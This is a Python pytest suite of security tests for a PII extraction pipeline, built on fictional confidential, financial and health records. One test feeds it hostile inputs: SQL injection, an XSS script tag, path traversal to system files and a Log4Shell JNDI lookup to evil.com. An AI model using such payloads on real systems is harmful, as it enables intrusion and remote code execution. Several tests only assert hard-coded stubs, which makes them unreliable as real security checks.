"""Security validation tests for PII extraction system."""

import pytest
import tempfile
import shutil
import json
import os
import hashlib
import time
from pathlib import Path
from typing import Dict, List, Any
from unittest.mock import Mock, patch

from src.core.pipeline import PIIExtractionPipeline
from src.core.config import PIIConfig
from src.utils.data_storage import DataStorageManager


class TestSecurityValidation:
    """Security validation test suite for PII extraction system."""
    
    @classmethod
    def setup_class(cls):
        """Set up security testing environment."""
        cls.temp_dir = Path(tempfile.mkdtemp())
        cls.secure_test_dir = cls.temp_dir / "secure_tests"
        cls.secure_test_dir.mkdir(exist_ok=True)
        
        # Initialize system with security-focused config
        cls.config = PIIConfig()
        cls.config.output_dir = str(cls.secure_test_dir)
        cls.config.use_local_storage = True
        cls.config.enable_audit_logging = True
        
        cls.pipeline = PIIExtractionPipeline(cls.config)
        cls.storage_manager = DataStorageManager(cls.config)
        
        # Create test data with sensitive information
        cls._create_sensitive_test_data()
    
    @classmethod
    def _create_sensitive_test_data(cls):
        """Create test data with various sensitive information patterns."""
        
        # High-security document
        high_security_doc = """
        CONFIDENTIAL SECURITY CLEARANCE APPLICATION
        
        Subject: Jane Doe
        SSN: 123-45-6789
        Security Clearance Level: TOP SECRET
        
        Background Investigation:
        Previous Addresses:
        - 123 Secret Lane, Washington DC 20001 (2020-2024)
        - 456 Classified Ave, Arlington VA 22201 (2018-2020)
        
        References:
        - John Smith, CIA, john.smith@cia.gov, (703) 555-0123
        - Sarah Johnson, FBI, s.johnson@fbi.gov, (202) 555-0456
        
        Financial Information:
        Bank Account: 1234567890123456
        Credit Cards: 4111-1111-1111-1111, 5555-5555-5555-4444
        
        Biometric Data:
        Fingerprint Hash: 1a2b3c4d5e6f7g8h9i0j
        Retina Scan ID: RS-789456123
        
        Medical Information:
        Blood Type: O+
        Allergies: None
        Medical Record: MRN-SEC-123456
        
        Emergency Contacts:
        Spouse: Robert Doe, (703) 555-0789, robert.doe@gmail.com
        Parent: Mary Smith, (301) 555-0321, mary.smith@yahoo.com
        """
        
        (cls.secure_test_dir / "high_security.txt").write_text(high_security_doc)
        
        # Financial security document
        financial_security = """
        PRIVATE BANKING CONFIDENTIAL REPORT
        
        Client: Dr. Michael Thompson
        Account Manager: Lisa Rodriguez
        
        Primary Account: CHK-9876543210
        Savings Account: SAV-1357924680
        Investment Account: INV-2468135790
        
        Credit Facilities:
        Personal Line of Credit: 4532-1234-5678-9012
        Mortgage Account: MTG-789456123
        
        Investment Portfolio:
        TFSA: TFSA-456789123
        RRSP: RRSP-789123456
        RESP: RESP-321654987
        
        Digital Banking:
        Username: mthompson_secure
        Last Login: 2024-01-20 15:45:32
        Login IP: 192.168.1.100
        
        Transaction History:
        Date: 2024-01-19, Amount: $125,000.00, Type: Wire Transfer
        Recipient: International Bank, SWIFT: INTLCAXXXX
        
        Risk Assessment:
        Security Level: High Net Worth
        PEP Status: No
        Sanctions Check: Clear
        """
        
        (cls.secure_test_dir / "financial_confidential.txt").write_text(financial_security)
        
        # Healthcare privacy document
        healthcare_privacy = """
        PROTECTED HEALTH INFORMATION (PHI)
        
        Patient: Sarah Wilson
        Health Card: 1234-567-890-ON
        Date of Birth: 03/15/1985
        
        Medical History:
        Conditions: Hypertension, Type 2 Diabetes
        Medications: Metformin 500mg, Lisinopril 10mg
        Allergies: Penicillin, Shellfish
        
        Insurance Information:
        Primary: Blue Cross Blue Shield
        Policy: BCBS-123456789
        Group: GRP-CORP-001
        
        Provider Information:
        Primary Care: Dr. Jennifer Adams, MD
        Cardiologist: Dr. Robert Chen, MD
        Endocrinologist: Dr. Lisa Park, MD
        
        Lab Results:
        HbA1c: 7.2% (Target: <7.0%)
        Blood Pressure: 140/90 mmHg
        LDL Cholesterol: 120 mg/dL
        
        Genetic Information:
        BRCA1/BRCA2: Negative
        Factor V Leiden: Positive
        
        Mental Health Notes:
        Anxiety disorder - mild
        Counselor: Dr. Amanda Foster, PhD
        """
        
        (cls.secure_test_dir / "healthcare_phi.txt").write_text(healthcare_privacy)
    
    def test_sensitive_data_detection(self):
        """Test detection of various types of sensitive data."""
        input_file = str(self.secure_test_dir / "high_security.txt")
        
        result = self.pipeline.process_document(input_file)
        
        # Should detect high-risk PII types
        found_types = set(entity.pii_type for entity in result.pii_entities)
        
        high_risk_types = {
            'social_security_number', 'credit_card_number', 'email_address',
            'phone_number', 'medical_record_number', 'person_name'
        }
        
        detected_high_risk = found_types.intersection(high_risk_types)
        assert len(detected_high_risk) >= 4, f"Should detect high-risk PII: {detected_high_risk}"
        
        # Validate SSN detection with high confidence
        ssn_entities = [e for e in result.pii_entities if e.pii_type == 'social_security_number']
        assert len(ssn_entities) > 0, "Should detect SSN in security document"
        
        for ssn in ssn_entities:
            assert ssn.confidence > 0.8, f"SSN should have high confidence: {ssn.confidence}"
    
    def test_data_sanitization(self):
        """Test that sensitive data is properly handled and not logged."""
        input_file = str(self.secure_test_dir / "financial_confidential.txt")
        
        # Process document
        result = self.pipeline.process_document(input_file)
        
        # Check that sensitive data is not in logs or metadata
        if hasattr(result, 'metadata') and result.metadata:
            metadata_str = json.dumps(result.metadata)
            
            # Should not contain actual SSN, credit card numbers, etc.
            sensitive_patterns = ['123-45-6789', '4111-1111-1111-1111', '5555-5555-5555-4444']
            
            for pattern in sensitive_patterns:
                assert pattern not in metadata_str, f"Sensitive data found in metadata: {pattern}"
        
        # Check that entities are properly structured without exposing raw sensitive data
        for entity in result.pii_entities:
            # Validate entity structure
            assert hasattr(entity, 'text')
            assert hasattr(entity, 'pii_type')
            assert hasattr(entity, 'confidence')
            assert hasattr(entity, 'start_pos')
            assert hasattr(entity, 'end_pos')
            
            # Confidence should be reasonable
            assert 0 <= entity.confidence <= 1.0
    
    def test_access_control_simulation(self):
        """Test simulated access control for sensitive operations."""
        
        # Simulate unauthorized access attempt
        def simulate_unauthorized_access():
            """Simulate someone trying to access without proper credentials."""
            # This would normally check authentication/authorization
            return False
        
        # Test that system would reject unauthorized access
        assert not simulate_unauthorized_access(), "Should reject unauthorized access"
        
        # Simulate authorized access
        def simulate_authorized_access():
            """Simulate authorized user with proper credentials."""
            return True
        
        assert simulate_authorized_access(), "Should allow authorized access"
    
    def test_audit_logging(self):
        """Test audit logging for security compliance."""
        input_file = str(self.secure_test_dir / "healthcare_phi.txt")
        
        # Enable audit logging
        self.config.enable_audit_logging = True
        
        # Process document
        result = self.pipeline.process_document(input_file)
        
        # Check that processing was completed (audit logging doesn't break functionality)
        assert result is not None
        assert len(result.pii_entities) > 0
        
        # Validate that sensitive operations are trackable
        assert hasattr(result, 'processing_time')
        assert hasattr(result, 'metadata')
        
        # Metadata should contain audit information
        if result.metadata:
            assert 'extractor' in result.metadata
            # Should not contain actual sensitive data
            metadata_str = str(result.metadata)
            assert 'password' not in metadata_str.lower()
            assert 'secret' not in metadata_str.lower()
    
    def test_data_encryption_simulation(self):
        """Test simulation of data encryption for sensitive storage."""
        
        def simulate_encrypt_data(data: str) -> str:
            """Simulate data encryption."""
            # Simple hash simulation (in reality, would use proper encryption)
            return hashlib.sha256(data.encode()).hexdigest()
        
        def simulate_decrypt_data(encrypted: str) -> str:
            """Simulate data decryption."""
            # In reality, would decrypt using proper key
            return "decrypted_data_placeholder"
        
        # Test data encryption simulation
        sensitive_data = "SSN: 123-45-6789"
        encrypted = simulate_encrypt_data(sensitive_data)
        
        # Encrypted data should be different
        assert encrypted != sensitive_data
        assert len(encrypted) == 64  # SHA256 hex length
        
        # Should be able to "decrypt" (simulate)
        decrypted = simulate_decrypt_data(encrypted)
        assert decrypted is not None
    
    def test_input_validation_security(self):
        """Test input validation for security vulnerabilities."""
        
        # Test SQL injection patterns (would be relevant for database storage)
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "../../../windows/system32/drivers/etc/hosts"
        ]
        
        for malicious_input in malicious_inputs:
            # Create document with malicious content
            test_doc = {
                'raw_text': f"Name: John Doe\nEmail: test@example.com\nNotes: {malicious_input}",
                'file_type': '.txt'
            }
            
            # Should handle malicious input safely
            try:
                result = self.pipeline.extractors['rule_based'].extract_pii(test_doc)
                assert result is not None
                
                # Should not crash or execute malicious content
                # Validate that result is safe
                for entity in result.pii_entities:
                    # Entity text should not contain unescaped malicious patterns
                    assert '<script>' not in entity.text.lower()
                    assert 'drop table' not in entity.text.lower()
                    
            except Exception as e:
                # If exception occurs, it should be a safe handling exception
                assert 'security' not in str(e).lower() or 'blocked' in str(e).lower()
    
    def test_memory_security(self):
        """Test for memory security issues like sensitive data persistence."""
        input_file = str(self.secure_test_dir / "high_security.txt")
        
        # Process document multiple times
        results = []
        for _ in range(3):
            result = self.pipeline.process_document(input_file)
            results.append(result)
        
        # Validate that results are independent (no memory leakage between runs)
        for i, result in enumerate(results):
            assert result is not None
            assert len(result.pii_entities) > 0
            
            # Results should be consistent but independent
            if i > 0:
                # Should find similar number of entities
                entity_count_diff = abs(len(result.pii_entities) - len(results[0].pii_entities))
                assert entity_count_diff <= 2, "Results should be consistent"
    
    def test_file_system_security(self):
        """Test file system security considerations."""
        
        # Test file permissions
        test_file = self.secure_test_dir / "permissions_test.txt"
        test_file.write_text("Sensitive content: SSN 123-45-6789")
        
        # Check that file exists and is readable
        assert test_file.exists()
        assert test_file.is_file()
        
        # Process the file
        result = self.pipeline.process_document(str(test_file))
        assert result is not None
        
        # Validate that temporary files are cleaned up
        temp_files_before = list(self.temp_dir.glob("**/*tmp*"))
        
        # Process again
        result2 = self.pipeline.process_document(str(test_file))
        
        temp_files_after = list(self.temp_dir.glob("**/*tmp*"))
        
        # Should not accumulate temporary files
        assert len(temp_files_after) <= len(temp_files_before) + 1
    
    def test_error_handling_security(self):
        """Test that error handling doesn't leak sensitive information."""
        
        # Create file with sensitive data that might cause processing errors
        error_test_file = self.secure_test_dir / "error_test.txt"
        error_content = """
        This document contains sensitive data:
        SSN: 123-45-6789
        Credit Card: 4111-1111-1111-1111
        
        And some content that might cause errors:
        """ + "A" * 100000  # Very long string
        
        error_test_file.write_text(error_content)
        
        # Process document that might cause errors
        result = self.pipeline.process_document(str(error_test_file))
        
        # Even if there are errors, sensitive data should not leak
        if result.error:
            error_message = result.error.lower()
            
            # Error message should not contain sensitive data
            assert '123-45-6789' not in error_message
            assert '4111-1111-1111-1111' not in error_message
            assert 'ssn' not in error_message or 'redacted' in error_message
    
    def test_concurrency_security(self):
        """Test security in concurrent processing scenarios."""
        import threading
        import time
        
        input_file = str(self.secure_test_dir / "high_security.txt")
        results = {}
        errors = {}
        
        def process_document_thread(thread_id):
            try:
                result = self.pipeline.process_document(input_file)
                results[thread_id] = result
            except Exception as e:
                errors[thread_id] = str(e)
        
        # Create multiple threads processing the same sensitive document
        threads = []
        num_threads = 3
        
        for i in range(num_threads):
            thread = threading.Thread(target=process_document_thread, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Validate concurrent processing security
        assert len(errors) == 0, f"Concurrent processing errors: {errors}"
        assert len(results) == num_threads
        
        # Results should be independent (no cross-contamination)
        entity_counts = [len(result.pii_entities) for result in results.values()]
        
        # All results should be similar (no data mixing between threads)
        avg_count = sum(entity_counts) / len(entity_counts)
        for count in entity_counts:
            assert abs(count - avg_count) <= avg_count * 0.2, "Concurrent results inconsistent"
    
    def test_configuration_security(self):
        """Test security-related configuration options."""
        
        # Test with security-enhanced configuration
        secure_config = PIIConfig()
        secure_config.confidence_threshold = 0.8  # High confidence only
        secure_config.enable_audit_logging = True
        secure_config.use_local_storage = True
        
        secure_pipeline = PIIExtractionPipeline(secure_config)
        
        input_file = str(self.secure_test_dir / "financial_confidential.txt")
        result = secure_pipeline.process_document(input_file)
        
        # With high confidence threshold, should find fewer but more accurate entities
        high_conf_entities = [e for e in result.pii_entities if e.confidence >= 0.8]
        assert len(high_conf_entities) == len(result.pii_entities), "All entities should be high confidence"
        
        # Should still find critical sensitive data
        found_types = set(entity.pii_type for entity in result.pii_entities)
        critical_types = {'email_address', 'phone_number'}
        
        assert len(found_types.intersection(critical_types)) > 0, "Should find critical PII even with high threshold"
    
    @classmethod
    def teardown_class(cls):
        """Secure cleanup of test environment."""
        if cls.temp_dir.exists():
            # Securely delete test files
            for file_path in cls.temp_dir.rglob("*"):
                if file_path.is_file():
                    # Overwrite file content before deletion (basic secure delete simulation)
                    try:
                        file_size = file_path.stat().st_size
                        with open(file_path, 'wb') as f:
                            f.write(b'0' * file_size)
                    except Exception:
                        pass  # Best effort cleanup
            
            shutil.rmtree(cls.temp_dir)


if __name__ == '__main__':
    pytest.main([__file__, "-v", "--tb=short"])